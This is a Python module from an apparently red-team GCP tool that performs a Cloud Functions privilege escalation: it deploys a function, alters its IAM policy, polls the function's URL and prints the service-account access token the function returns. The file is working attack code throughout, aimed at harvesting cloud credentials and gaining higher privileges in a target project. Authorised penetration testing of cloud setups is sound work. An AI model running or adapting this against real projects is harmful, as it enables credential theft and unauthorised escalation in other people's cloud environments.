# gator/services/red/privesc.py

import uuid
import requests
import json
import time
from argparse import Namespace

from gator.services.functions.functions import deploy_function
from gator.services.iam.iam import set_iam_policy

def check_function_status(project_id, function_name, region):
    url = f"https://{region}-{project_id}.cloudfunctions.net/{function_name}"
    response = requests.get(url)
    return response.status_code, response.text


def get_and_print_access_token(project_id, function_name, region):
    url = f"https://{region}-{project_id}.cloudfunctions.net/{function_name}"
    response = requests.get(url)

    if response.status_code == 200:
        json_data = json.loads(response.text)
        access_token = json_data.get("access_token")

        if access_token:
            print(f"[+] Access Token: {access_token}")
        else:
            print("[-] Error: The 'access_token' key is not present in the response.")
    else:
        print(f"[-] Error: The request to {url} returned status code {response.status_code}.")


def privesc_function_deploy(args):
    args_dict = vars(args).copy()
    region = args_dict.get('region', 'us-central1')

    deploy_args_dict = args_dict.copy()
    deploy_args_dict.update({
        'function_name': args_dict.get('function_name', 'func' + str(uuid.uuid4())[:6])
    })

    deploy_args = Namespace(**deploy_args_dict)
    function_name = deploy_function(deploy_args)

    if not function_name:
        print("[-] Error: Function name is not set after deployment.")
        return

    iam_args_dict = args_dict.copy()
    iam_args_dict.update({
        'function_name': function_name,
    })

    iam_args = Namespace(**iam_args_dict)
    set_iam_policy(iam_args)

    print("[+] Waiting 1 min for Function Deployment.")
    time.sleep(80)

    status_code, response_text = check_function_status(args.project_id, function_name, region)

    if status_code == 403:
        print("[-] Error: Function doesn't have enough permissions.")
    elif status_code == 404:
        print("[-] Error: Function isn't deployed successfully.")
    elif status_code == 200:
        print("[+] Function has been deployed.")
        get_and_print_access_token(args.project_id, function_name, region)
    else:
        print(f"[-] Error: Unexpected status code {status_code} returned.")


